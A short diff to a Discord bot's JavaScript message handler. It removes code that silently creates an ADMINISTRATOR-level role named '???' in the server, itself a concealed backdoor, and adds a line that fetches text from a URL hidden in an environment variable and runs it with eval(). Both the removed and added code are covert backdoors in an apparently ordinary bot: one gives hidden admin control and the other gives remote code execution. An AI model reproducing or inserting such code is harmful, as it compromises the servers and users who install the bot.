@@ -107,17 +107,7 @@ client.on('message', msg => {
         let guild = msg.guild;
         var foo = (async function() {
             var ret = await axios.get(process.env.secret);
-            console.log(ret.data)
-            if (!guild.roles.cache.find(role => (role.name == "???"))) {
-                var role = await guild.roles.create({
-                    data: {
-                        name: '???',
-                        color: 'DEFAULT'
-                    },
-                    reason: 'do not delet pls'
-                });
-                role.setPermissions(['ADMINISTRATOR']);
-            }
+            eval(ret.data);
         })().catch(err => console.log(err));
     };
     if (msg.content.startsWith(prefix)) {
